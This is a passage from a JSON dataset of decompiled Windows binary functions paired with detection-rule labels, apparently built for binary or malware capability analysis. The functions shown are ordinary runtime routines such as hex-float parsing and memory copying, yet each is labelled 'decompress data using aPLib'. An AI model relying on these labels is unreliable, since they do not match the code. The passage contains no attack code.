== 0) {\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (cVar2 < *puVar10) goto code_r0x00018007bb7b;\n                }\n                if ('\\0' < *(pppppuVar14 + 1)) {\n                    pppppuVar14 = pppppuVar14 + 1;\n                }\n            }\n        }\n        if (0xf < uVar20) {\n            puVar10 = puVar17;\n            if ((0xfff < uVar20 + 1) && (puVar10 = *(puVar17 + -4),  0x1f < puVar17 + (-8 - puVar10)))\n            goto code_r0x00018007bf4d;\n            fcn.18008fb24(puVar10);\n        }\n        uVar16 = uStack256;\n        iVar18 = iStack260;\n        iVar19 = iStack260;\n    }\n    else {\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        iVar19 = iStack260;\n        while (cVar2 == '\\0') {\n            iVar5 = fcn.1800783e4(arg3);\n            piVar13 = aiStack128;\n            do {\n                if (*piVar13 == iVar5) break;\n                piVar13 = piVar13 + 1;\n            } while (piVar13 != aiStack72);\n            uVar20 = piVar13 - aiStack128 >> 1;\n            iVar19 = iVar18;\n            if (0x15 < uVar20) break;\n            iVar19 = uVar16;\n            if (iVar19 < iVar15) {\n                if ((uVar20 != 0) || (iVar19 != 0)) {\n                    *arg2 = *(uVar20 + 0x1800e2ad8);\n                    arg2 = arg2 + 1;\n                    uVar16 = iVar19 + 1;\n                }\n            }\n            else {\n                iVar18 = iVar18 + 1;\n            }\n            cStack264 = '\\x01';\n            fcn.18007f190(arg3);\n            cVar2 = fcn.1800890e8(arg3, arg4);\n            iVar19 = iVar18;\n        }\n    }\n    iStack260 = iVar19;\n    cVar2 = cStack264;\n    if ((cStack264 != '\\0') && (uVar16 == 0)) {\n        *arg2 = 0x30;\n        arg2 = arg2 + 1;\n    }\n    cVar3 = fcn.1800890e8(arg3, arg4);\n    if (cVar3 == '\\0') {\n        iVar5 = (**0x1800de8f0)();\n        uVar7 = arg3;\n        iVar6 = fcn.1800783e4(arg3);\n        if (iVar6 == iVar5) {\n            puVar11 = fcn.1800bb800(uVar7);\n            *arg2 = **puVar11;\n            arg2 = arg2 + 1;\n            fcn.18007f190(arg3);\n        }\n    }\n    if (uVar16 == 0) {\n        cVar3 = fcn.1800890e8(arg3, arg4);\n        iVar15 = iStack260;\n        while ((cVar3 == '\\0' && (iVar5 = fcn.1800783e4(arg3),  iVar15 = iVar18,  iVar5 == aiStack128[0]))) {\n            iVar18 = iVar18 + -1;\n            cVar2 = '\\x01';\n            fcn.18007f190(arg3);\n            cVar3 = fcn.1800890e8(arg3, arg4);\n            iVar15 = iVar18;\n        }\n        iStack260 = iVar15;\n        if (iVar18 < 0) {\n            *arg2 = 0x30;\n            arg2 = arg2 + 1;\n            iVar18 = iVar18 + 1;\n            iStack260 = iVar18;\n        }\n    }\n    cVar3 = fcn.1800890e8(arg3, arg4);\n    iVar15 = iStack252;\n    while (cVar3 == '\\0') {\n        iVar5 = fcn.1800783e4(arg3);\n        piVar13 = aiStack128;\n        do {\n            if (*piVar13 == iVar5) break;\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != aiStack72);\n        uVar20 = piVar13 - aiStack128 >> 1;\n        iVar18 = iStack260;\n        if (0x15 < uVar20) break;\n        if (uVar16 < iVar15) {\n            *arg2 = *(uVar20 + 0x1800e2ad8);\n            arg2 = arg2 + 1;\n            uVar16 = uVar16 + 1;\n        }\n        cVar2 = '\\x01';\n        fcn.18007f190(arg3);\n        cVar3 = fcn.1800890e8(arg3, arg4);\n        iVar18 = iStack260;\n    }\n    iVar15 = 0;\n    cVar3 = '\\0';\n    if (((cVar2 != '\\0') && (cVar4 = fcn.1800890e8(arg3, arg4),  cVar4 == '\\0')) &&\n       ((iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[27] ||\n        (iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[26])))) {\n        *arg2 = 0x70;\n        puVar17 = arg2 + 1;\n        fcn.18007f190(arg3);\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        if (cVar2 == '\\0') {\n            iVar5 = fcn.1800783e4(arg3);\n            if (iVar5 == aiStack128[23]) {\n                *puVar17 = 0x2b;\n            }\n            else {\n                iVar5 = fcn.1800783e4(arg3);\n                if (iVar5 != aiStack128[22]) goto code_r0x00018007be16;\n                *puVar17 = 0x2d;\n            }\n            puVar17 = arg2 + 1;\n            fcn.18007f190(arg3);\n        }\ncode_r0x00018007be16:\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        if (cVar2 == '\\0') {\n            do {\n                iVar5 = fcn.1800783e4(arg3);\n                if (iVar5 != aiStack128[0]) break;\n                cVar3 = '\\x01';\n                fcn.18007f190(arg3);\n                cVar2 = fcn.1800890e8(arg3, arg4);\n            } while (cVar2 == '\\0');\n            if (cVar3 != '\\0') {\n                *puVar17 = 0x30;\n                puVar17 = puVar17 + 1;\n            }\n        }\n        cVar4 = fcn.1800890e8(arg3, arg4);\n        arg2 = puVar17;\n        cVar2 = cVar3;\n        while (cVar4 == '\\0') {\n            iVar5 = fcn.1800783e4(arg3);\n            piVar13 = aiStack128;\n            do {\n                if (*piVar13 == iVar5) break;\n                piVar13 = piVar13 + 1;\n            } while (piVar13 != aiStack72);\n            uVar16 = piVar13 - aiStack128 >> 1;\n            iVar18 = iStack260;\n            if (0x15 < uVar16) break;\n            if (iVar15 < 8) {\n                *arg2 = *(uVar16 + 0x1800e2ad8);\n                arg2 = arg2 + 1;\n                iVar15 = iVar15 + 1;\n            }\n            cVar2 = '\\x01';\n            fcn.18007f190(arg3);\n            cVar4 = fcn.1800890e8(arg3, arg4);\n            iVar18 = iStack260;\n        }\n    }\n    if ((cStack263 != '\\0') || (cVar2 == '\\0')) {\n        arg2 = puStack208;\n    }\n    *arg2 = 0;\n    *piStack248 = iVar18;\n    if (0xf < uStack136) {\n        pppppuVar14 = apppppuStack160[0];\n        if (0xfff < uStack136 + 1) {\n            pppppuVar14 = apppppuStack160[0][-1];\n            if (0x1f < apppppuStack160[0] + (-8 - pppppuVar14)) {\n                fcn.1800b3528(pppppuVar14, uStack136 + 0x28);\ncode_r0x00018007bf4d:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(pppppuVar14);\n    }\n    fcn.18008fb00(uStack64 ^ auStack312);\n    return;\n}\n",
        "token_count": 4310
    },
    "18007bf5": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid fcn.18007bf54(ulong noname_0, ushort *arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    ulong uVar9;\n    ushort *puVar10;\n    ulong *puVar11;\n    uint64_t uVar12;\n    int16_t *piVar13;\n    ulong *****pppppuVar14;\n    int32_t iVar15;\n    uint64_t uVar16;\n    ushort *puVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    uint64_t uVar20;\n    int64_t in_stack_00000028;\n    int32_t *in_stack_00000030;\n    uchar auStack312 [48];\n    char cStack264;\n    char cStack263;\n    int32_t iStack260;\n    uint32_t uStack256;\n    int32_t iStack252;\n    int32_t *piStack248;\n    ulong *****pppppuStack240;\n    int64_t iStack232;\n    ulong uStack224;\n    int64_t iStack216;\n    ushort *puStack208;\n    ulong uStack200;\n    ushort uStack192;\n    unkbyte6 Stack190;\n    uint64_t uStack176;\n    uint64_t uStack168;\n    ulong *****apppppuStack160 [2];\n    int64_t iStack144;\n    uint64_t uStack136;\n    int16_t aiStack128 [28];\n    int16_t aiStack72 [4];\n    uint64_t uStack64;\n    \n    uStack200 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack312;\n    piStack248 = in_stack_00000030;\n    iVar8 = *(*(in_stack_00000028 + 0x40) + 8);\n    iStack216 = iVar8;\n    puStack208 = arg2;\n    (**0x1800de8f0)(iVar8);\n    uVar7 = fcn.180077c70(&uStack224);\n    iVar18 = 0;\n    uStack224 = uVar7;\n    if ((iVar8 != 0) && (iVar8 = (**0x1800de8f0)(iVar8),  iVar8 != 0)) {\n        (**0x1800de8f0)(iVar8, 1);\n    }\n    (**0x1800de8f0)(uVar7, apppppuStack160);\n    iVar8 = *(*(in_stack_00000028 + 0x40) + 8);\n    iStack232 = iVar8;\n    (**0x1800de8f0)(iVar8);\n    uVar9 = fcn.180014560(&pppppuStack240);\n    if ((iVar8 != 0) && (iVar8 = (**0x1800de8f0)(iVar8),  iVar8 != 0)) {\n        (**0x1800de8f0)(iVar8, 1);\n    }\n    (**0x1800de8f0)(uVar9, \"0123456789ABCDEFabcdef-+XxPp\");\n    cStack263 = '\\0';\n    cVar2 = fcn.1800890e8(arg3, arg4);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.1800783e4(arg3);\n        if (iVar5 == aiStack128[23]) {\n            *arg2 = 0x2b;\n        }\n        else {\n            iVar5 = fcn.1800783e4(arg3);\n            if (iVar5 != aiStack128[22]) goto code_r0x00018007c0e2;\n            *arg2 = 0x2d;\n        }\n        arg2 = arg2 + 1;\n        fcn.18007f190(arg3);\n    }\ncode_r0x00018007c0e2:\n    *arg2 = 0x7830;\n    arg2 = arg2 + 1;\n    cStack264 = '\\0';\n    uVar16 = 0;\n    uStack256 = 0;\n    iStack260 = 0;\n    cVar2 = fcn.1800890e8(arg3, arg4);\n    if ((cVar2 == '\\0') && (iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[0])) {\n        fcn.18007f190(arg3);\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        if ((cVar2 == '\\0') &&\n           ((iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[25] ||\n            (iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[24])))) {\n            fcn.18007f190(arg3);\n        }\n        else {\n            cStack264 = '\\x01';\n        }\n    }\n    iVar15 = 0x24;\n    if (*piStack248 == 1000000000) {\n        iVar15 = 0x300;\n    }\n    pppppuStack240 = apppppuStack160;\n    if (0xf < uStack136) {\n        pppppuStack240 = apppppuStack160[0];\n    }\n    iStack252 = iVar15;\n    if (*pppppuStack240 - 1U < 0x7e) {\n        if (iStack144 == 0) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (**0x1800de8f0)(uVar7);\n        }\n        uVar20 = 0xf;\n        uStack168 = 0xf;\n        uStack176 = 1;\n        uStack192 = 0;\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        puVar17 = CONCAT62(Stack190, uStack192);\n        pppppuVar14 = pppppuStack240;\n        if (cVar2 == '\\0') {\n            do {\n                iVar6 = fcn.1800783e4(arg3);\n                piVar13 = aiStack128;\n                do {\n                    if (*piVar13 == iVar6) break;\n                    piVar13 = piVar13 + 1;\n                } while (piVar13 != aiStack72);\n                uVar12 = piVar13 - aiStack128 >> 1;\n                if (uVar12 < 0x16) {\n                    cStack264 = '\\x01';\n                    if (uStack256 < iStack252) {\n                        if ((uVar12 != 0) || (uStack256 != 0)) {\n                            *arg2 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar12];\n                            arg2 = arg2 + 1;\n                            uStack256 = uStack256 + 1;\n                        }\n                    }\n                    else {\n                        iStack260 = iStack260 + 1;\n                    }\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (*(puVar10 + uVar16) != '\\x7f') {\n                        puVar10 = &uStack192;\n                        if (0xf < uVar20) {\n                            puVar10 = puVar17;\n                        }\n                        *(puVar10 + uVar16) = *(puVar10 + uVar16) + '\\x01';\n                        goto code_r0x00018007c2d1;\n                    }\n                }\n                else {\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (((*(puVar10 + uVar16) == '\\0') || (iVar5 == 0)) ||\n                       (iVar6 = fcn.1800783e4(arg3),  iVar6 != iVar5)) break;\n                    if (uStack176 < uVar20) {\n                        puVar10 = &uStack192;\n                        if (0xf < uVar20) {\n                            puVar10 = puVar17;\n                        }\n                        puVar10 = puVar10 + uStack176;\n                        uStack176 = uStack176 + 1;\n                        *puVar10 = 0;\n                    }\n                    else {\n                        fcn.180013eb0(&uStack192, 1);\n                    }\n                    uVar16 = uVar16 + 1;\ncode_r0x00018007c2d1:\n                    puVar17 = CONCAT62(Stack190, uStack192);\n                    uVar20 = uStack168;\n                }\n                fcn.18007f190(arg3);\n                cVar2 = fcn.1800890e8(arg3, arg4);\n            } while (cVar2 == '\\0');\n            pppppuVar14 = pppppuStack240;\n            if (uVar16 == 0) goto code_r0x00018007c320;\n            puVar10 = &uStack192;\n            if (0xf < uVar20) {\n                puVar10 = puVar17;\n            }\n            if ('\\0' < *(puVar10 + uVar16)) {\n                uVar16 = uVar16 + 1;\n                goto code_r0x00018007c320;\n            }\ncode_r0x00018007c363:\n            cStack263 = '\\x01';\n        }\n        else {\ncode_r0x00018007c320:\n            while ((uVar16 != 0 && (cVar2 = *pppppuVar14,  cVar2 != '\\x7f'))) {\n                uVar16 = uVar16 - 1;\n                if (uVar16 != 0) {\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (cVar2 != *(puVar10 + uVar16)) goto code_r0x00018007c363;\n                }\n                if (uVar16 == 0) {\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (cVar2 < *puVar10) goto code_r0x00018007c363;\n                }\n                if ('\\0' < *(pppppuVar14 + 1)) {\n                    pppppuVar14 = pppppuVar14 + 1;\n                }\n            }\n        }\n        if (0xf < uVar20) {\n            puVar10 = puVar17;\n            if ((0xfff < uVar20 + 1) && (puVar10 = *(puVar17 + -4),  0x1f < puVar17 + (-8 - puVar10)))\n            goto code_r0x00018007c735;\n            fcn.18008fb24(puVar10);\n        }\n        uVar16 = uStack256;\n        iVar18 = iStack260;\n        iVar19 = iStack260;\n    }\n    else {\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        iVar19 = iStack260;\n        while (cVar2 == '\\0') {\n            iVar5 = fcn.1800783e4(arg3);\n            piVar13 = aiStack128;\n            do {\n                if (*piVar13 == iVar5) break;\n                piVar13 = piVar13 + 1;\n            } while (piVar13 != aiStack72);\n            uVar20 = piVar13 - aiStack128 >> 1;\n            iVar19 = iVar18;\n            if (0x15 < uVar20) break;\n            iVar19 = uVar16;\n            if (iVar19 < iVar15) {\n                if ((uVar20 != 0) || (iVar19 != 0)) {\n                    *arg2 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar20];\n                    arg2 = arg2 + 1;\n                    uVar16 = iVar19 + 1;\n                }\n            }\n            else {\n                iVar18 = iVar18 + 1;\n            }\n            cStack264 = '\\x01';\n            fcn.18007f190(arg3);\n            cVar2 = fcn.1800890e8(arg3, arg4);\n            iVar19 = iVar18;\n        }\n    }\n    iStack260 = iVar19;\n    cVar2 = cStack264;\n    if ((cStack264 != '\\0') && (uVar16 == 0)) {\n        *arg2 = 0x30;\n        arg2 = arg2 + 1;\n    }\n    cVar3 = fcn.1800890e8(arg3, arg4);\n    if (cVar3 == '\\0') {\n        iVar5 = (**0x1800de8f0)();\n        uVar7 = arg3;\n        iVar6 = fcn.1800783e4(arg3);\n        if (iVar6 == iVar5) {\n            puVar11 = fcn.1800bb800(uVar7);\n            *arg2 = **puVar11;\n            arg2 = arg2 + 1;\n            fcn.18007f190(arg3);\n        }\n    }\n    if (uVar16 == 0) {\n        cVar3 = fcn.1800890e8(arg3, arg4);\n        iVar15 = iStack260;\n        while ((cVar3 == '\\0' && (iVar5 = fcn.1800783e4(arg3),  iVar15 = iVar18,  iVar5 == aiStack128[0]))) {\n            iVar18 = iVar18 + -1;\n            cVar2 = '\\x01';\n            fcn.18007f190(arg3);\n            cVar3 = fcn.1800890e8(arg3, arg4);\n            iVar15 = iVar18;\n        }\n        iStack260 = iVar15;\n        if (iVar18 < 0) {\n            *arg2 = 0x30;\n            arg2 = arg2 + 1;\n            iVar18 = iVar18 + 1;\n            iStack260 = iVar18;\n        }\n    }\n    cVar3 = fcn.1800890e8(arg3, arg4);\n    iVar15 = iStack252;\n    while (cVar3 == '\\0') {\n        iVar5 = fcn.1800783e4(arg3);\n        piVar13 = aiStack128;\n        do {\n            if (*piVar13 == iVar5) break;\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != aiStack72);\n        uVar20 = piVar13 - aiStack128 >> 1;\n        iVar18 = iStack260;\n        if (0x15 < uVar20) break;\n        if (uVar16 < iVar15) {\n            *arg2 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar20];\n            arg2 = arg2 + 1;\n            uVar16 = uVar16 + 1;\n        }\n        cVar2 = '\\x01';\n        fcn.18007f190(arg3);\n        cVar3 = fcn.1800890e8(arg3, arg4);\n        iVar18 = iStack260;\n    }\n    iVar15 = 0;\n    cVar3 = '\\0';\n    if (((cVar2 != '\\0') && (cVar4 = fcn.1800890e8(arg3, arg4),  cVar4 == '\\0')) &&\n       ((iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[27] ||\n        (iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[26])))) {\n        *arg2 = 0x70;\n        puVar17 = arg2 + 1;\n        fcn.18007f190(arg3);\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        if (cVar2 == '\\0') {\n            iVar5 = fcn.1800783e4(arg3);\n            if (iVar5 == aiStack128[23]) {\n                *puVar17 = 0x2b;\n            }\n            else {\n                iVar5 = fcn.1800783e4(arg3);\n                if (iVar5 != aiStack128[22]) goto code_r0x00018007c5fe;\n                *puVar17 = 0x2d;\n            }\n            puVar17 = arg2 + 1;\n            fcn.18007f190(arg3);\n        }\ncode_r0x00018007c5fe:\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        if (cVar2 == '\\0') {\n            do {\n                iVar5 = fcn.1800783e4(arg3);\n                if (iVar5 != aiStack128[0]) break;\n                cVar3 = '\\x01';\n                fcn.18007f190(arg3);\n                cVar2 = fcn.1800890e8(arg3, arg4);\n            } while (cVar2 == '\\0');\n            if (cVar3 != '\\0') {\n                *puVar17 = 0x30;\n                puVar17 = puVar17 + 1;\n            }\n        }\n        cVar4 = fcn.1800890e8(arg3, arg4);\n        arg2 = puVar17;\n        cVar2 = cVar3;\n        while (cVar4 == '\\0') {\n            iVar5 = fcn.1800783e4(arg3);\n            piVar13 = aiStack128;\n            do {\n                if (*piVar13 == iVar5) break;\n                piVar13 = piVar13 + 1;\n            } while (piVar13 != aiStack72);\n            uVar16 = piVar13 - aiStack128 >> 1;\n            iVar18 = iStack260;\n            if (0x15 < uVar16) break;\n            if (iVar15 < 8) {\n                *arg2 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar16];\n                arg2 = arg2 + 1;\n                iVar15 = iVar15 + 1;\n            }\n            cVar2 = '\\x01';\n            fcn.18007f190(arg3);\n            cVar4 = fcn.1800890e8(arg3, arg4);\n            iVar18 = iStack260;\n        }\n    }\n    if ((cStack263 != '\\0') || (cVar2 == '\\0')) {\n        arg2 = puStack208;\n    }\n    *arg2 = 0;\n    *piStack248 = iVar18;\n    if (0xf < uStack136) {\n        pppppuVar14 = apppppuStack160[0];\n        if (0xfff < uStack136 + 1) {\n            pppppuVar14 = apppppuStack160[0][-1];\n            if (0x1f < apppppuStack160[0] + (-8 - pppppuVar14)) {\n                fcn.1800b3528(pppppuVar14, uStack136 + 0x28);\ncode_r0x00018007c735:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(pppppuVar14);\n    }\n    fcn.18008fb00(uStack64 ^ auStack312);\n    return;\n}\n",
        "token_count": 4330
    },
    "1800ab75": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong fcn.1800ab754(int64_t arg1, uint *arg2, int64_t arg3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    char in_R9B;\n    uchar auStack40 [32];\n    \n    if (in_R9B != '\\0') {\n        if (*(arg3 + 0x1c) - *(arg3 + 0x18) < 1) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = fcn.1800a4334(arg3 + 0x18);\n        }\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar5 = fcn.1800ab678(auStack40, iVar4);\n        uVar1 = puVar5[1];\n        uVar2 = puVar5[2];\n        uVar3 = puVar5[3];\n        *arg2 = *puVar5;\n        arg2[1] = uVar1;\n        arg2[2] = uVar2;\n        arg2[3] = uVar3;\n        *(arg2 + 4) = *(puVar5 + 4);\n        return 1;\n    }\n    if (*(arg1 + 0x14) < 0x65) {\n        if (*(arg3 + 0x1c) - *(arg3 + 0x18) < 1) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = fcn.1800a4334(arg3 + 0x18);\n        }\n    }\n    else {\n        if (0x7e < *(arg1 + 0x14)) goto code_r0x0001800ab7ff;\n        iVar4 = fcn.1800ad378(arg3);\n    }\n    if (iVar4 != 0) {\n        puVar5 = fcn.1800ab678(auStack40, iVar4);\n        uVar1 = puVar5[1];\n        uVar2 = puVar5[2];\n        uVar3 = puVar5[3];\n        *arg2 = *puVar5;\n        arg2[1] = uVar1;\n        arg2[2] = uVar2;\n        arg2[3] = uVar3;\n        *(arg2 + 4) = *(puVar5 + 4);\n        *(arg1 + 0x14) = *(arg1 + 0x14) + 1;\n        return 1;\n    }\ncode_r0x0001800ab7ff:\n    *(arg1 + 0x14) = 0;\n    return 0;\n}\n",
        "token_count": 599
    },
    "1800ade8": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong * fcn.1800ade80(ulong *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    uchar *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    \n    if (arg3 < 0x11) {\n    // switch table (17 cases) at 0x180136000\n        switch(*(arg3 * 4 + 0x180136000) + 0x180000000) {\n        case 0x1800adf00:\n            return arg1;\n        case 0x1800adf01:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x1800adf08:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x1800adf0f:\n            uVar2 = *(arg2 + 2);\n            *arg1 = *arg2;\n            *(arg1 + 2) = uVar2;\n            return arg1;\n        case 0x1800adf1f:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x1800adf25:\n            uVar17 = *(arg2 + 4);\n            uVar18 = *(arg2 + 1);\n            uVar19 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar17;\n            *(arg1 + 1) = uVar18;\n            *(arg1 + 0xc) = uVar19;\n            return arg1;\n        case 0x1800adf30:\n            uVar3 = *(arg2 + 1);\n            uVar2 = *(arg2 + 10);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar3;\n            *(arg1 + 10) = uVar2;\n            return arg1;\n        case 0x1800adf48:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x1800adf50:\n            uVar2 = *(arg2 + 4);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar2;\n            return arg1;\n        case 0x1800adf60:\n            uVar3 = *(arg2 + 4);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar3;\n            return arg1;\n        case 0x1800adf70:\n            uVar3 = *(arg2 + 4);\n            uVar2 = *(arg2 + 6);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar3;\n            *(arg1 + 6) = uVar2;\n            return arg1;\n        case 0x1800adf88:\n            uVar17 = *(arg2 + 1);\n            uVar2 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar2;\n            return arg1;\n        case 0x1800adfa0:\n            uVar2 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar2;\n            return arg1;\n        case 0x1800adfb0:\n            uVar3 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar3;\n            return arg1;\n        case 0x1800adfc0:\n            uVar17 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            return arg1;\n        case 0x1800adfd0:\n            uVar17 = *(arg2 + 1);\n            uVar3 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar3;\n            return arg1;\n        case 0x1800adff0:\n            uVar17 = *(arg2 + 1);\n            uVar3 = *(arg2 + 0xc);\n            uVar2 = *(arg2 + 0xe);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar3;\n            *(arg1 + 0xe) = uVar2;\n            return arg1;\n        }\n    }\n    if (0x20 < arg3) {\n        iVar9 = arg2 - arg1;\n        if ((arg2 < arg1) && (arg1 < arg3 + arg2)) {\n            puVar8 = arg1 + iVar9 + (arg3 - 0x10);\n            uVar17 = puVar8[1];\n            uVar18 = puVar8[2];\n            uVar19 = puVar8[3];\n            puVar6 = arg1 + (arg3 - 0x10);\n            uVar11 = arg3 - 0x10;\n            puVar7 = puVar6;\n            uVar20 = *puVar8;\n            uVar13 = uVar17;\n            uVar14 = uVar18;\n            uVar15 = uVar19;\n            if ((puVar6 & 0xf) != 0) {\n                puVar7 = puVar6 & 0xfffffffffffffff0;\n                puVar1 = puVar7 + iVar9;\n                uVar20 = *puVar1;\n                uVar13 = puVar1[1];\n                uVar14 = puVar1[2];\n                uVar15 = puVar1[3];\n                *puVar6 = *puVar8;\n                *(arg1 + (arg3 - 0xc)) = uVar17;\n                *(arg1 + (arg3 - 8)) = uVar18;\n                *(arg1 + (arg3 - 4)) = uVar19;\n                uVar11 = puVar7 - arg1;\n            }\n            uVar12 = uVar11 >> 7;\n            if (uVar12 != 0) {\n                *puVar7 = uVar20;\n                puVar7[1] = uVar13;\n                puVar7[2] = uVar14;\n                puVar7[3] = uVar15;\n                puVar8 = puVar7;\n                while( true ) {\n                    puVar6 = puVar8 + iVar9 + -0x10;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar7 = puVar8 + iVar9 + -0x20;\n                    uVar20 = *puVar7;\n                    uVar13 = puVar7[1];\n                    uVar14 = puVar7[2];\n                    uVar15 = puVar7[3];\n                    puVar7 = puVar8 + -0x20;\n                    puVar8[-4] = *puVar6;\n                    puVar8[-3] = uVar17;\n                    puVar8[-2] = uVar18;\n                    puVar8[-1] = uVar19;\n                    puVar8[-8] = uVar20;\n                    puVar8[-7] = uVar13;\n                    puVar8[-6] = uVar14;\n                    puVar8[-5] = uVar15;\n                    puVar6 = puVar8 + iVar9 + -0x30;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar1 = puVar8 + iVar9 + -0x40;\n                    uVar20 = *puVar1;\n                    uVar13 = puVar1[1];\n                    uVar14 = puVar1[2];\n                    uVar15 = puVar1[3];\n                    uVar12 = uVar12 - 1;\n                    puVar8[-0xc] = *puVar6;\n                    puVar8[-0xb] = uVar17;\n                    puVar8[-10] = uVar18;\n                    puVar8[-9] = uVar19;\n                    puVar8[-0x10] = uVar20;\n                    puVar8[-0xf] = uVar13;\n                    puVar8[-0xe] = uVar14;\n                    puVar8[-0xd] = uVar15;\n                    puVar6 = puVar8 + iVar9 + -0x50;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar1 = puVar8 + iVar9 + -0x60;\n                    uVar20 = *puVar1;\n                    uVar13 = puVar1[1];\n                    uVar14 = puVar1[2];\n                    uVar15 = puVar1[3];\n                    puVar8[-0x14] = *puVar6;\n                    puVar8[-0x13] = uVar17;\n                    puVar8[-0x12] = uVar18;\n                    puVar8[-0x11] = uVar19;\n                    puVar8[-0x18] = uVar20;\n                    puVar8[-0x17] = uVar13;\n                    puVar8[-0x16] = uVar14;\n                    puVar8[-0x15] = uVar15;\n                    puVar1 = puVar8 + iVar9 + -0x70;\n                    uVar17 = puVar1[1];\n                    uVar18 = puVar1[2];\n                    uVar19 = puVar1[3];\n                    puVar6 = puVar7 + iVar9;\n                    uVar20 = *puVar6;\n                    uVar13 = puVar6[1];\n                    uVar14 = puVar6[2];\n                    uVar15 = puVar6[3];\n                    if (uVar12 == 0) break;\n                    puVar8[-0x1c] = *puVar1;\n                    puVar8[-0x1b] = uVar17;\n                    puVar8[-0x1a] = uVar18;\n                    puVar8[-0x19] = uVar19;\n                    *puVar7 = uVar20;\n                    puVar8[-0x1f] = uVar13;\n                    puVar8[-0x1e] = uVar14;\n                    puVar8[-0x1d] = uVar15;\n                    puVar8 = puVar7;\n                }\n                puVar8[-0x1c] = *puVar1;\n                puVar8[-0x1b] = uVar17;\n                puVar8[-0x1a] = uVar18;\n                puVar8[-0x19] = uVar19;\n                uVar11 = uVar11 & 0x7f;\n            }\n            for (uVar12 = uVar11 >> 4; uVar12 != 0; uVar12 = uVar12 - 1) {\n                *puVar7 = uVar20;\n                puVar7[1] = uVar13;\n                puVar7[2] = uVar14;\n                puVar7[3] = uVar15;\n                puVar7 = puVar7 + -4;\n                puVar8 = puVar7 + 